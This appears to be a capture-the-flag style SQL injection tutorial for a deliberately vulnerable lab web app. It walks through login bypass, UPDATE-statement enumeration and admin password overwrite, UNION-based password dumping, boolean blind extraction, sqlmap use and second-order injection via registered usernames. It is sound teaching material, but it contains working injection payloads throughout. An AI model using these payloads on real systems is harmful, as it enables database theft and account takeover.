# SQL injection

## Introduction to SQL injection part1

SQL injection is a technique through which attackers can execute
their own malicious SQL
statements generally referred to as a malicious payload. Through the
malicious SQL statements, attackers can steal information from the
victim’s database; even worse, they may be able to make changes to the
database. Our employee management web application has SQL injection
vulnerabilities, which mimic the mistakes frequently made by developers.

Applications
will often need dynamic SQL queries to be able to display content based
on different conditions set by the user. To allow for dynamic SQL
queries, developers often concatenate user input directly into the SQL
statement. Without checks on the received input, string concatenation
becomes the most common mistake that leads to SQL injection
vulnerability. Without input sanitization, the user can make the
database interpret the user input as a SQL statement instead of as data.
In other words, the attacker must have access to a parameter that they
can control, which goes into the SQL statement. With control of a
parameter, the attacker can inject a malicious query, which will be
executed by the database. If the application does not sanitize the given
input from the attacker-controlled parameter, the query will be
vulnerable to SQL injection attack.

The following [PHP]()
code demonstrates a dynamic SQL query in a login from. The user and
password variables from the POST request is concatenated directly into
the SQL statement.

<pre><div><div><span>$</span>query <span>=</span> <span>"</span><span>SELECT * FROM users WHERE username='</span><span>"</span> <span>+</span> <span>$</span><span>_POST</span><span>[</span><span>"</span><span>user</span><span>"</span><span>]</span> <span>+</span> <span>"</span><span>' AND password= '</span><span>"</span> <span>+</span> <span>$</span><span>_POST</span><span>[</span><span>"</span><span>password</span><span>"</span><span>]</span><span>$</span> <span>+</span> <span>'</span><span>";"</span></div></div></pre>

If the attacker supplies the value  ' OR 1=1-- - inside
the name parameter, the query might return more than one user. Most
applications will process the first user returned, meaning that the
attacker can exploit this and log in as the first user the query
returned. The double-dash (--) sequence is a comment indicator in SQL
and causes the rest of the query to be commented out. In SQL, a string
is enclosed within either a single quote (') or a double quote ("). The
single quote (') in the input is used to close the string literal. If
the attacker enters ' OR 1=1-- - in the name parameter and leaves the password blank, the query above will result in the following SQL statement.

<pre><div><span>SELECT</span> <span>*</span> <span>FROM</span> users <span>WHERE</span> username <span>=</span> <span>''</span> <span>OR</span> <span>1</span><span>=</span><span>1</span><span>-- -</span><span>'</span><span> AND password = </span><span>''</span></div></pre>

If the database executes the SQL statement above, all the users in
the users table are returned. Consequently, the attacker bypasses the
application's authentication mechanism and is logged in as the first
user returned by the query.

The reason for using  -- - instead of -- is primarily because of how MySQL handles the double-dash comment style.

From a --  sequence to the end of the line. In MySQL, the --
(double-dash) comment style requires the second dash to be followed by
at least one whitespace or control character (such as a space, tab,
newline, and so on). This syntax differs slightly from standard SQL
comment syntax, as discussed in Section 1.7.2.4, “'--' as the Start of a Comment”. ([dev.mysql.com](https://dev.mysql.com/doc/refman/8.0/en/comments.html))

The safest solution for inline SQL comment is to use --<space><any character> such as -- - because if it is URL-encoded into  --%20- it will still be decoded as -- -. For more information, see: [https://blog.raw.pm/en/sql-injection-mysql-comment/](https://blog.raw.pm/en/sql-injection-mysql-comment/)

##### SQL Injection 1: Input Box Non-String

When a user logs in, the application performs the following query:

<pre><div><span>SELECT</span> uid<span>,</span> name<span>,</span> profileID<span>,</span> salary<span>,</span> passportNr<span>,</span> email<span>,</span> nickName<span>,</span> password <span>FROM</span> usertable <span>WHERE</span> profileID<span>=</span><span>10</span> <span>AND</span> password <span>=</span> <span>'</span><span>ce5ca67...</span><span>'</span></div></pre>

When logging in, the user supplies input to the profileID parameter.
For this challenge, the parameter accepts an integer, as can be seen
here:

<pre><div>profileID<span>=</span><span>10</span></div></pre>

Since there is no input sanitization, it is possible to bypass the
login by using any True condition such as the one below as the ProfileID

<pre><div><span>1</span> <span>or</span> <span>1</span><span>=</span><span>1</span><span>-- -</span></div></pre>

Bypass the login and retrieve the flag.

##### SQL Injection 2: Input Box String

This challenge uses the same query as in
the previous challenge. However, the parameter expects a string instead
of an integer, as can be seen here:

<pre><div>profileID<span>=</span><span>'</span><span>10</span><span>'</span></div></pre>

Since it expects a string, we need to modify our payload to bypass the login slightly. The following line will let us in:

<pre><div><span>1</span><span>'</span><span> or </span><span>'</span><span>1</span><span>'</span><span>=</span><span>'</span><span>1</span><span>'</span><span>-- -</span></div></pre>

Bypass the login and retrieve the flag.

##### SQL Injection 3 and 4: URL and POST Injection

Here, the SQL query is the same as the previous one:

<pre><div><span>SELECT</span> uid<span>,</span> name<span>,</span> profileID<span>,</span> salary<span>,</span> passportNr<span>,</span> email<span>,</span> nickName<span>,</span> password <span>FROM</span> usertable <span>WHERE</span> profileID<span>=</span><span>'</span><span>10</span><span>'</span> <span>AND</span> password<span>=</span><span>'</span><span>ce5ca67...</span><span>'</span></div></pre>

But in this case, the malicious user input cannot be injected
directly into the application via the login form because some
client-side controls have been implemented:

<pre><div><div><span>function</span> <span>validateform</span><span>()</span> <span>{</span></div><div>    <span>var</span> <span>profileID</span> <span>=</span> <span>document</span><span>.</span><span>inputForm</span><span>.</span><span>profileID</span><span>.</span><span>value</span><span>;</span></div><div>    <span>var</span> <span>password</span> <span>=</span> <span>document</span><span>.</span><span>inputForm</span><span>.</span><span>password</span><span>.</span><span>value</span><span>;</span></div><br/><div>    <span>if</span> (<span>/</span><span>^</span><span>[</span><span>a-zA-Z0-9</span><span>]*</span><span>$</span><span>/</span><span>.</span><span>test</span>(<span>profileID</span>) <span>==</span> <span>false</span> <span>||</span><span> </span><span>/</span><span>^</span><span>[</span><span>a-zA-Z0-9</span><span>]*</span><span>$</span><span>/</span><span>.</span><span>test</span>(<span>password</span>) <span>==</span> <span>false</span>) <span>{</span></div><div>        <span>alert</span>(<span>"</span><span>The input fields cannot contain special characters</span><span>"</span>)<span>;</span></div><div>        <span>return</span> <span>false</span><span>;</span></div><div>    <span>}</span></div><div>    <span>if</span> (<span>profileID</span> <span>==</span> <span>null</span> <span>||</span> <span>password</span> <span>==</span> <span>null</span>) <span>{</span></div><div>        <span>alert</span>(<span>"</span><span>The input fields cannot be empty.</span><span>"</span>)<span>;</span></div><div>        <span>return</span> <span>false</span><span>;</span></div><div>    <span>}</span></div><div><span>}</span></div></div></pre>

The JavaScript code above requires that both the profileID and the
password only contains characters between a-z, A-Z, and 0-9. Client-side
controls are only there to improve the user experience and is in no way
a security feature as the user has full control over the client and the
data it submits. For example, a proxy tool such as Burp Suite can be
used to bypass the client side JavaScript validation ([https://portswigger.net/support/using-burp-to-bypass-client-side-javascript-validation](https://portswigger.net/support/using-burp-to-bypass-client-side-javascript-validation)).

**

SQL Injection 3: URL Injection
** This challenge uses a GET request when submitting the login form, as seen here:

![](https://i.imgur.com/9RvTzkK.png)

The login and the client-side validation can then easily be bypassed by going directly to this URL:

http://MACHINE_IP:5000/sesqli3/login?profileID=-1' or 1=1-- -&password=a

The browser will automatically urlencode this for us. Urlencoding is needed since the [HTTP]() protocol does not support all characters in the request. When urlencoded, the URL looks as follows:

http://MACHINE_IP:5000/sesqli3/login?profileID=-1%27%20or%201=1--%20-&password=a

The %27 becomes the single quote (') character and %20 becomes a blank space.

##### SQL Injection 4: POST Injection

##### When submitting the login form for this challenge, it uses the [HTTP]()

POST method. It is possible to either remove/disable the JavaScript
validating the login form or submit a valid request and intercept it
with a proxy tool such as Burp Suite and modify it:

![](https://i.imgur.com/LRnr2WQ.png)

For information on how Burp Suite works, visit the  [Burp Suite](https://tryhackme.com/room/rpburpsuite) room.

## Introduction to SQL injection part 2

#### SQL Injection Attack on an UPDATE Statement

If a SQL injection occurs on an UPDATE statement, the damage can be
much more severe as it allows one to change records within the database.
In the employee management application, there is an edit profile page
as depicted in the following figure.

![](https://i.imgur.com/cBwDJev.png)

This
edit page allows the employees to update their information, but they do
not have access to all the available fields, and the user can only
change their information. If the form is vulnerable to SQL injection, an
attacker can bypass the implemented logic and update fields they are
not supposed to, or for other users.

We will now enumerate the
database via the UPDATE statement on the profile page. We will assume we
have no prior knowledge of the database. By looking at the web page's
source code, we can identify potential column names by looking at the
name attribute. The columns don't necessarily need to be named this, but
there is a good chance of it, and column names such as "email" and
"password" are not uncommon and can easily be guessed.

![](https://i.imgur.com/hFMf6BJ.png)

To confirm that the form is vulnerable and that we have working column
names, we can try to inject something similar to the code below into the
nickName and email field:

<pre><div><span>asd</span><span>'</span><span>,</span>nickName<span>=</span><span>'</span><span>test</span><span>'</span><span>,</span>email<span>=</span><span>'</span><span>hacked</span></div></pre>

When injecting the malicious payload into the nickName field, only
the nickName is updated. When injected into the email field, both fields
are updated:

![](https://i.imgur.com/z5xciWd.png)

The
first test confirmed that the application is vulnerable and that we
have the correct column names. If we had the wrong column names, then
non of the fields would have been updated. Since both fields are updated
after injecting the malicious payload, the original SQL statement
likely looks something similar to the following code:

<pre><div><span>UPDATE</span> <span><</span>table_name<span>></span> <span>SET</span> nickName<span>=</span><span>'</span><span>name</span><span>'</span><span>,</span> email<span>=</span><span>'</span><span>email</span><span>'</span> <span>WHERE</span> <span><</span>condition<span>></span></div></pre>

With this knowledge, we can try to identify what database is in use.
There are a few ways to do this, but the easiest way is to ask the
database to identify itself. The following queries can be used to
identify MySQL, MSSQL, Oracle, and SQLite:

<pre><div><div><span># MySQL and MSSQL</span></div><div><span>',</span>nickName<span>=@@</span>version<span>,</span>email<span>=</span><span>'</span></div><div><span># For Oracle</span></div><div><span>',</span>nickName<span>=(</span><span>SELECT</span> banner <span>FROM</span> v<span>$</span>version<span>),</span>email<span>=</span><span>'</span></div><div><span># For SQLite</span></div><div><span>',</span>nickName<span>=</span>sqlite_version<span>(),</span>email<span>=</span><span>'</span></div></div></pre>

Injecting the line with "sqlite_version()" into the nickName field
shows that we are dealing with SQLite and that the version number is
3.27.2:

![](https://i.imgur.com/zHesMks.png)

Knowing what database we are dealing with makes it easier to
understand how to construct our malicious queries. We can proceed to
enumerate the database by extracting all the tables. In the code below,
we perform a subquery to fetch all the tables from database and place
them into the nickName field. The subquery is enclosed inside
parantheses. The [group_concat()](https://sqlite.org/lang_aggfunc.html#groupconcat) function is used to dump all the tables simultaneously.

> "The
> group_concat() function returns a string which is the concatenation of
> all non-NULL values of X. If parameter Y is present then it is used as
> the separator between instances of X. A comma (",") is used as the
> separator if Y is omitted. The order of the concatenated elements is
> arbitrary."

<pre><div><div><span>',</span>nickName<span>=(</span><span>SELECT</span> group_concat<span>(</span>tbl_name<span>)</span> <span>FROM</span> sqlite_master <span>WHERE</span> <span>type</span>=<span>'</span><span>table</span><span>'</span> <span>and</span> tbl_name <span>NOT</span> like <span>'</span><span>sqlite_%</span><span>'</span><span>),</span>email<span>=</span><span>'</span></div></div></pre>

By injecting the code above, we can see that the only table in the database is called "usertable":

![](https://i.imgur.com/cqhlsgn.png)

We can then continue by extract all the column names from the usertable:

<pre><div><span>',</span>nickName<span>=(</span><span>SELECT</span> sql <span>FROM</span> sqlite_master <span>WHERE</span> <span>type</span><span>!=</span><span>'</span><span>meta</span><span>'</span> <span>AND</span> sql <span>NOT</span> <span>NULL</span> <span>AND</span> name =<span>'</span><span>usertable</span><span>'</span><span>),</span>email<span>=</span><span>'</span></div></pre>

And as can be seen below, the usertable contains the columns: [UID](), name, profileID, salary, passportNr, email, nickName, and password:

![](https://i.imgur.com/Gu1VdgI.png)

By
knowing the names of the columns, we can extract the data we want from
the database. For example, the query below will extract profileID, name,
and passwords from usertable. The subquery is using the [group_concat()](https://sqlite.org/lang_aggfunc.html#groupconcat) function to dump all the information simultaneously, and the [||](https://sqlite.org/lang_expr.html#operators) operator is "concatenate" - it joins together the strings of its operands ([sqlite.org](https://sqlite.org/lang_expr.html#operators)).

<pre><div><div><span>',</span>nickName<span>=(</span><span>SELECT</span> group_concat<span>(</span>profileID <span>||</span> <span>"</span><span>,</span><span>"</span> <span>||</span> name <span>||</span> <span>"</span><span>,</span><span>"</span> <span>||</span> password <span>||</span> <span>"</span><span>:</span><span>"</span><span>)</span> <span>from</span> usertable<span>),</span>email<span>=</span><span>'</span></div></div></pre>

![](https://i.imgur.com/jZG8mJG.png)

After
having dumped the data from the database, we can see that the password
is hashed. This means that we will need to identify the correct hash
type used if we want to update the password for a user. Using a hash
identifier such as hash-identifier, we can identify the hash as SHA256:

![](https://i.imgur.com/woCJbL5.png)

There are multiple ways of generating a sha256 hash. For example, we can use [https://gchq.github.io/CyberChef/](https://gchq.github.io/CyberChef/):

![](https://i.imgur.com/zaV6o4k.png)

We can then update the password for the Admin user with the following code:

<pre><div><span>',</span> password<span>=</span><span>'</span><span>008c70392e3abfbd0fa47bbc2ed96aa99bd49e159727fcba0f2e6abeb3a9d601</span><span>'</span> <span>WHERE</span> name<span>=</span><span>'</span><span>Admin</span><span>'</span><span>-- -</span></div></pre>

##### Task

Log in to the "SQL Injection 5: UPDATE
Statement" challenge and exploit the vulnerable profile page to find the flag. The credentials that can be use are:

* profileID:`10`
* password:`toor`

The same enumeration demonstrated for finding tables and column names must be done here since the flag is stored inside another table.

## Vulnerable startup Broken Authentification

### Goal

### The goal of this challenge is to find a way to bypass  the authentication to retrieve the flag.

### Description

From the landing page on [http://MACHINE_IP:5000,](http://MACHINE_IP:5000,) go to Broken Authentication under Track: Vulnerable Startup ([http://MACHINE_IP:5000/challenge1/](http://MACHINE_IP:5000/challenge1/)).

![](https://i.imgur.com/1YeHcLR.png)

### Task

Bypass the login and retrieve the flag.

## Vulnerable startup Broken authentification part 2


### Goal

This challenge builds upon the previous challenge. Here, the goal is
to find a way to dump all the passwords in the database to retrieve the
flag without using blind injection.

### Description

The login form is still vulnerable to SQL injection, and it is possible to bypass the login by using ' OR 1=1-- - as a username.

Before
dumping all the passwords, we need to identify places where results
from the login query is returned within the application. After logging
in, the name of the currently logged-on user is displayed in the top
right corner, so it might be possible to dump the data there, as seen
here:

![](https://i.imgur.com/Xys9X1M.png)

Data
from the query could also be stored in the session cookie. It is
possible to extract the session cookie by opening developer tools in the
browser, which can be done by pressing F12. Then navigate to Storage
and copy the value of the session cookie, as seen here:

![](https://i.imgur.com/hRu6pKD.png)

Then it is possible to decode the cookie at [https://www.kirsle.net/wizards/flask-session.cgi](https://www.kirsle.net/wizards/flask-session.cgi) or via a custom script. A script to decode the cookie can be downloaded inside the [VM]() by going to [http://MACHINE_IP:5000/download/decode_cookie.py](http://MACHINE_IP:5000/download/decode_cookie.py).

After having logged in with ' OR 1=1-- - as username, the decoded cookie can be seen below, and it is clear that the user id and username from the login query are placed inside it.

<pre><div><div><span>{</span></div><div>    <span>"</span><span>challenge2_user_id</span><span>"</span><span>:</span> <span>1</span><span>,</span></div><div>    <span>"</span><span>challenge2_username</span><span>"</span><span>:</span> <span>"</span><span>admin</span><span>"</span></div><div><span>}</span></div></div></pre>

It is possible to dump the passwords by using a UNION based SQL
injection. There are two key requirements that must be met for a UNION
based injection to work:

* The number of columns in the injected query must be the same as in the original query
* The data types for each column must match the corresponding type

When logging in to the application, it executed the query below. From
the SQL statement, we can see that it is retrieving two columns; id and
username.

<pre><div><span>SELECT</span> <span>id</span><span>,</span> username <span>FROM</span> users <span>WHERE</span> username <span>=</span> <span>'</span><span>" + username + "</span><span>'</span> <span>AND</span> password <span>=</span> <span>'</span><span>" + password + "</span><span>'</span></div></pre>

Without knowing the number of columns upfront, the attacker must
first enumerate the number of columns by systematically injecting
queries with different numbers of columns until it is successful. For
example:

<pre><div><div> <span>1</span><span>'</span><span> UNION SELECT NULL-- -</span></div><div> <span>1</span><span>'</span><span> UNION SELECT NULL, NULL-- -</span></div><div> <span>1</span><span>'</span><span> UNION SELECT NULL, NULL, NULL-- -</span></div></div></pre>

In this case, successful means that the application will successfully
login when the correct number of columns is injected. In other cases,
if error messages are enabled, a warning might be displayed saying
"SELECTs to the left and right of UNION do not have the same number of
result columns" when incorrect number of columns are injected.

By using ' UNION SELECT 1,2-- - as
username, we match the number of columns in the original SQL query, and
the application lets us in. After logging in, we can see that the
username is replaced with the integer 2, which is what we used as column
two in the injected query.

![](https://i.imgur.com/CiqrL78.png)

The same goes for the username in the session cookie. By decoding it,
we can see that the username has been replaced with the same value as
above.

<pre><div><div><span>{</span></div><div>    <span>"</span><span>challenge2_user_id</span><span>"</span><span>:</span> <span>1</span><span>,</span></div><div>    <span>"</span><span>challenge2_username</span><span>"</span><span>:</span> <span>2</span></div><div><span>}</span></div></div></pre>

Enumerate the database to find tables and columns, as we did under Task 2 Introduction to SQL Injection. A cheat sheet such as [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md) can
be helpful for this. The challenge's objective was to dump all the
passwords to get the flag, so in this case, we will guess that the
column name is *password* and that the table name is *users* . With this logic, it is possible to dump the passwords with the following code:

<pre><div><span>'</span> <span>UNION</span> <span>SELECT</span> <span>1</span><span>,</span> password <span>from</span> users<span>-- -</span></div></pre>

However, the previous statement will only return one password. The [group_concat()](https://sqlite.org/lang_aggfunc.html#groupconcat) function can help achieve the goal of dumping all the passwords simultaneously.

By injecting the following code into the username field:

<pre><div>' <span>UNION</span> <span>SELECT</span> <span>1</span><span>,</span>group_concat<span>(</span>password<span>)</span> <span>FROM</span> users<span>-- -</span></div></pre>

All the passwords are dumped:

![](https://i.imgur.com/A98eMkg.png)

The passwords can also be retrieved by decoding the Flask session cookie:

<pre><div><div><span>{</span></div><div>    <span>"</span><span>challenge2_user_id</span><span>"</span><span>:</span> <span>1</span><span>,</span></div><div>    <span>"</span><span>challenge2_username</span><span>"</span><span>:</span> <span>"</span><span>rcLYWHCxeGUsA9tH3GNV,asd,Summer2019!,345m3io4hj3,THM</span><span>{AuTh2}</span><span>,viking123</span><span>"</span></div><div><span>}</span></div></div>
</pre>

### Task

Exploit the vulnerable login form and retrieve the flag.

## Vulnerable startup broken authentification 3 (Blind injection)


### Goal

This challenge has the same vulnerability as the previous one.
However, it is no longer possible to extract data from the Flask session
cookie or via the username display. The login form still has the same
vulnerability, but this time the goal is to abuse the login form with
blind SQL injection to extract the admin's password.

### Description

Boolean-based blind SQL injection will be used to extract the
password. Blind injections are tedious and time-consuming to do
manually, so the plan is to build a script to extract the password
character by character. Before making a script to automate the
injection, it is vital to understand how the injection works.  The idea
is to send a SQL query asking true or false questions for each character
in the password. The application's response will be analyzed to
understand whether the database returned true or false. In this case,
the application will let us in if the response is successful, or it will
stay on the login page saying, "Invalid username or password" in the
case it returns false, as seen in the image below.

![](https://i.imgur.com/ma1IrzN.png)

As
previously stated, we will want to send boolean questions to the
database for each character in the password, asking the database whether
we have guessed the correct character or not. To achieve this, we will
need a way to control which character we are at and increment it every
time we have guessed the correct character at the current position.
SQLite's [substr](https://sqlite.org/lang_corefunc.html#substr) function can help us achieve this functionality.

"The SQLite substr function returns a substring from a string starting at a specified position with a predefined length." ([SQLite Tutorial](https://www.sqlitetutorial.net/sqlite-functions/sqlite-substr/))

The first argument to [substr](https://sqlite.org/lang_corefunc.html#substr) is
the string itself, which will be the admin's password. The second
argument is the starting position, and the third argument is the length
of the substring that will be returned.

<pre><div>SUBSTR<span>(</span> string<span>,</span> <span><</span>start<span>>,</span> <span><</span>length<span>>)</span></div></pre>

Below is an example of [substr](https://sqlite.org/lang_corefunc.html#substr) in action - the character after the equal (=) sign demonstrates the substring returned.

<pre><div><div><span>--</span> Changing start</div><div>SUBSTR<span>(</span><span>"</span><span>THM</span><span>{Blind}</span><span>"</span><span>,</span> <span>1</span><span>,</span><span>1</span><span>)</span> <span>=</span> T</div><div>SUBSTR<span>(</span><span>"</span><span>THM</span><span>{Blind}</span><span>"</span><span>,</span> <span>2</span><span>,</span><span>1</span><span>)</span> <span>=</span> H</div><div>SUBSTR<span>(</span><span>"</span><span>THM</span><span>{Blind}</span><span>"</span><span>,</span> <span>3</span><span>,</span><span>1</span><span>)</span> <span>=</span> M</div><br/><div><span>--</span> Changing length</div><div>SUBSTR<span>(</span><span>"</span><span>THM</span><span>{Blind}</span><span>"</span><span>,</span> <span>1</span><span>,</span><span>3</span><span>)</span> <span>=</span> <span>THM</span></div></div>
</pre>

The next step will be to enter the admin's password as a string into the [substr](https://sqlite.org/lang_corefunc.html#substr) function. This can be achieved with the following query:

<pre><div><span>(</span><span>SELECT</span> password <span>FROM</span> users <span>LIMIT</span> <span>0</span><span>,</span><span>1</span><span>)</span></div></pre>

The [LIMIT](https://sqlite.org/lang_select.html#limitoffset) clause
is used to limit the amount of data returned by the SELECT statement.
The first number, 0, is the offset and the second integer is the limit:

<pre><div><span>LIMIT</span> <span><</span><span>OFFSET</span><span>>,</span> <span><</span><span>LIMIT</span><span>></span></div></pre>

Below are a few examples of the [LIMIT](https://sqlite.org/lang_select.html#limitoffset) clause in action. The right table represents the user table.

|

<pre><div><div>sqlite<span>></span> <span>SELECT</span> password <span>FROM</span> users <span>LIMIT</span> <span>0</span><span>,</span><span>1</span></div><div><span>THM</span><span>{</span>Blind<span>}</span></div><div>sqlite<span>></span> <span>SELECT</span> password <span>FROM</span> users <span>LIMIT</span> <span>1</span><span>,</span><span>1</span></div><div>Summer2019!</div><div>sqlite<span>></span> <span>SELECT</span> password <span>FROM</span> users <span>LIMIT</span> <span>0</span><span>,</span><span>2</span></div><div><span>THM</span><span>{</span>Blind<span>}</span></div><div>Summer2019!</div></div></pre>

| | THM{Blind}  |
| ------------- |
| Summer2019! |
| Viking123   |


|   |   |
| --- | --- |

The SQL query to return the first character of the admin's password can be seen here:

<pre><div>SUBSTR<span>((</span><span>SELECT</span> password <span>FROM</span> users <span>LIMIT</span> <span>0</span><span>,</span><span>1</span><span>),</span><span>1</span><span>,</span><span>1</span><span>)</span></div></pre>

Now we will need a way to compare the first character of the password
with our guessed value. Comparing the characters are easy, and we could
do it as follows:

<pre><div>SUBSTR<span>((</span><span>SELECT</span> password <span>FROM</span> users <span>LIMIT</span> <span>0</span><span>,</span><span>1</span><span>),</span><span>1</span><span>,</span><span>1</span><span>)</span> <span>=</span> <span>'</span><span>T</span><span>'</span></div></pre>

However, whether this approach works or not will be depending on how
the application handles the inputs. The application will convert the
username to lowercase for this challenge, which breaks the mentioned
approach since capital T is not the same as lowercase t. The hex
representation of ASCII T is 0x54 and 0x74 for lowercase t. To deal with
this, we can input our character as hex representation via the
substitution type [X](https://www.sqlite.org/printf.html#substitution_types) and then use SQLite's [CAST](https://sqlite.org/lang_expr.html#castexpr) expression to convert the value to the datatype the database expects.

"x,X:
The argument is an integer which is displayed in hexadecimal.
Lower-case hexadecimal is used for %x and upper-case is used for %X" - ([sqlite.org](https://www.sqlite.org/printf.html#substitution_types))

This
means that we can input T as X'54'. To convert the value to SQLite's
Text type, we can use the CAST expression as follows: CAST(X'54' as
Text). Our final query now looks as follows:

<pre><div>SUBSTR<span>((</span><span>SELECT</span> password <span>FROM</span> users <span>LIMIT</span> <span>0</span><span>,</span><span>1</span><span>),</span><span>1</span><span>,</span><span>1</span><span>)</span> <span>=</span> CAST<span>(</span>X<span>'</span><span>54</span><span>'</span> <span>as</span> Text<span>)</span></div></pre>

Before using the query we have built, we will need to make it fit in
with the original query. Our query will be placed in the username field.
We can close the username parameter by adding a single quote (') and
then append an AND operator to add our condition to it. Then append two
dashes (--) to comment out the password check at the end of the query.
With this done, our malicious query look as follows:

<pre><div><div><span>admin</span><span>'</span> <span>AND</span> SUBSTR<span>((</span><span>SELECT</span> password <span>FROM</span> users <span>LIMIT</span> <span>0</span><span>,</span><span>1</span><span>),</span><span>1</span><span>,</span><span>1</span><span>)</span> <span>=</span> CAST<span>(</span>X<span>'</span><span>54</span><span>'</span> <span>as</span> Text<span>)</span><span>-- -</span></div></div></pre>

When this is injected into the username field, the final query executed by the database will be:

<pre><div><span>SELECT</span> <span>id</span><span>,</span> username <span>FROM</span> users <span>WHERE</span> username <span>=</span> <span>'</span><span>admin</span><span>'</span> <span>AND</span> SUBSTR<span>((</span><span>SELECT</span> password <span>FROM</span> users <span>LIMIT</span> <span>0</span><span>,</span><span>1</span><span>),</span><span>1</span><span>,</span><span>1</span><span>)</span> <span>=</span> CAST<span>(</span>X<span>'</span><span>54</span><span>'</span> <span>as</span> Text<span>)</span></div></pre>

If the application responds with a 302 redirect, then we have found the
password's first character. To get the entire password, the attacker
must inject multiple tests for each character in the password. Testing
every single character is tedious and is more easily achieved with a
script. One easy solution is to loop over every possible ASCII character
and compare it with the database's character. The mentioned method
generates a lot of traffic toward the target and is not the most
efficient method. An example script is provided inside the machine and
can be view and downloaded by going to [http://MACHINE_IP:5000/view/challenge3/challenge3-exploit.py](http://MACHINE_IP:5000/view/challenge3/challenge3-exploit.py);
note that it will be necessary to change the password length with the
password_len variable. The length of the password can be found by asking
the database. For example, in the query below, we ask the database if
the length of the password equals 37:

<pre><div><div><span>admin</span><span>'</span> <span>AND</span> length<span>((</span><span>SELECT</span> password <span>from</span> users where username=<span>'</span><span>admin</span><span>'</span><span>))==</span><span>37</span><span>-- -</span></div></div></pre>

Also, the script requires an unnecessary amount of requests. An extra
challenge could be to build a more efficient tool to retrieve the
password.

An alternative way to solve this challenge is by using a tool such as
sqlmap, which is an open source tool that automates the process of
detecting and exploiting SQL injection flaws. The following command can
be used to exploit the vulnerability with sqlmap:

<pre><div><div><span>$</span> sqlmap <span>-</span>u http<span>://</span><span>MACHINE_IP</span><span>:</span><span>5000</span><span>/</span>challenge3<span>/</span>login <span>--</span>data<span>=</span><span>"</span><span>username=admin&password=admin</span><span>"</span> </div><div><span>--</span>level<span>=</span><span>5</span> <span>--</span>risk<span>=</span><span>3</span> <span>--</span>dbms<span>=</span>sqlite <span>--</span>technique<span>=</span>b <span>--</span>dump</div></div></pre>

![](https://i.imgur.com/Zd65ZQP.png)

### Task

Exploit the vulnerable login form and retrieve the flag.

## vulnerable startup vulnerable notes


### Goal

Here, the
previous vulnerabilities have been fixed, and the login form is no
longer vulnerable to SQL injection. The team has added a new note
function, allowing users to add notes on their page. The goal of this
challenge is to find the vulnerability and dump the database to find the
flag.

### Description

By registering a new account and logging in to
the application, the user can navigate to the new note function by
clicking "Notes" in the top left menu. Here, it is possible to add new
notes, and all the user's notes are listed on the bottom of the page, as
seen here:

![](https://i.imgur.com/Rhqnlaa.png)

The
notes function is not directly vulnerable, as the function to insert
notes is safe because it uses parameterized queries. With parameterized
queries, the SQL statement is specified first with placeholders (?) for
the parameters. Then the user input is passed into each parameter of the
query later. Parameterized queries allow the database to distinguish
between code and data, regardless of the input.

<pre><div><span>INSERT</span> <span>INTO</span> notes <span>(</span>username<span>,</span> title<span>,</span> note<span>)</span> VALUES <span>(</span><span>?</span><span>,</span> <span>?</span><span>,</span> <span>?</span><span>)</span></div></pre>

Even though parameterized queries are used, the server will accept
malicious data and place it in the database if the application does not
sanitize it. Still, the parameterized query prevents the input from
leading to SQL injection. Since the application might accept malicious
data, all queries must use parameterized queries, and not only for
queries directly accepting user input.

The user registration function also utilizes parameterized queries,
so when the query below is executed, only the INSERT statement gets
executed. It will accept any malicious input and place it in the
database if it doesn't sanitize it, but the parameterized query prevents
the input from leading to SQL injection.

<pre><div><span>INSERT</span> <span>INTO</span> users <span>(</span>username<span>,</span> password<span>)</span> VALUES <span>(</span><span>?</span><span>,</span> <span>?</span><span>)</span></div></pre>

However, the query that fetches all of the notes belonging to a user
does not use parameterized queries. The username is concatenated
directly into the query, making it vulnerable to SQL injection.

<pre><div><span>SELECT</span> title<span>,</span> note <span>FROM</span> notes <span>WHERE</span> username <span>=</span> <span>'</span><span>" + username + "</span><span>'</span></div></pre>

This means that if we register a user with a malicious name,
everything will be fine until the user navigates to the notes page and
the unsafe query tries to fetch the data for the malicious user.

By creating a user with the following name:

<pre><div><span>'</span> union select <span>1</span><span>,</span><span>2</span><span>'</span></div></pre>

We should be able to trigger the secondary injection:

![](https://i.imgur.com/MVYEVCi.png)

With this username, the application performs the following query:

<pre><div><span>SELECT</span> title<span>,</span> note <span>FROM</span> notes <span>WHERE</span> username <span>=</span> <span>''</span> union select <span>1</span><span>,</span><span>2</span><span>''</span></div></pre>

Then on the notes page as the new user, we can see that the first
column in the query is the note title, and the second column is the note
itself:

![](https://i.imgur.com/G3h1bOc.png)

With
this knowledge, this is rather easy to exploit. For example, to get all
the tables from the database, we can create a user with the name:

<pre><div><span>'</span> union select <span>1</span><span>,</span>group_concat<span>(</span>tbl_name<span>)</span> <span>from</span> sqlite_master where <span>type</span><span>=</span><span>'</span><span>table</span><span>'</span> <span>and</span> tbl_name <span>not</span> like <span>'</span><span>sqlite_%</span><span>''</span></div></pre>

To find the flag among the passwords, register a user with the name:

'  union select 1,group_concat(password) from users'

##### Automating Exploitation Using Sqlmap

It is possible to use sqlmap to automate this attack, but a standard
attack with sqlmap will fail. The injection happens at the user
registration, but the vulnerable function is located on the notes page.
For sqlmap to exploit this vulnerability, it must do the following
steps:

1. Register a malicious user
2. Login with the malicious user
3. Go to the notes page to trigger the injection

It
is possible to achieve all of the necessary steps by creating a tamper
script. Sqlmap supports tamper scripts, which are scripts used for
tampering with injection data. With a tamper script, we can easily
modify the payload, for example, adding a custom encoding to it. It also
allows us to set other things, such as cookies.

There are two custom functions in the tamper script below. The first function is *create_account()* , which register a user with sqlmap's payload as name and 'asd' as password. The next custom function is *login()* , which logs sqlmap in as the newly created user and returns the Flask session cookie. *tamper()* is the main function in the script, and it has the *payload* and ***kwargs * as arguments. ***kwargs* holds information such as the [HTTP]()
headers, which we need to place the Flask session cookie onto the
request to allow sqlmap to go to the notes page to trigger the SQL
injection. The *tamper()* function first gets the headers from *kwargs* , then creates a new user on the application, and then it logs in to the application and sets the Flask session onto the [HTTP]() header object.

